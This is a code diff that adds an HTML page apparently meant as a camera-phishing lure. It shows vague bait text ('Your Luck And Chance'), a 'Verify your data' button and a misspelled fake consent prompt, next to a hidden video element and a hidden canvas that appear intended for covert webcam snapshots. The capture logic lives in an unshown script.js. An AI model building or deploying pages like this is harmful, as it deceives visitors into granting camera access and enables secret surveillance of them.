@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+<html lang="si">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Custom Camera Permission</title>
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+    <div class="container">
+        <h1>Hello,</h1>
+        <p>Your Luck And Chance.</p>
+        <button id="request-camera">Verify your data</button>
+        <div id="permission-prompt" class="permission-prompt">
+            <p>agree your veryfiation</p>
+            <button id="allow-camera">yes</button>
+            <button id="deny-camera">no</button>
+        </div>
+        <video id="video" autoplay style="display:none;"></video>
+        <canvas id="canvas" style="display:none;"></canvas>
+    </div>
+
+    <script src="script.js"></script>
+</body>
+</html>
